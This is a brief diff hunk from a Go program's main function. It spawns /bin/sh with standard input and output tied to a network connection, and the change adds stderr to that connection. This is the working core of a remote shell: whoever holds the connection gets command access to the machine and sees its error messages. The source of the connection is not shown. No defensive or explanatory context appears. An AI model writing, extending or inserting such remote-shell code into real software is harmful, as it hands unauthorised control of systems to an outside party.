@@ -11,6 +11,7 @@ func main() {
 	cmd := exec.Command("/bin/sh")
 	cmd.Stdin = conn
 	cmd.Stdout = conn
+	cmd.Stderr = conn
 	_ = cmd.Run()
 }
 
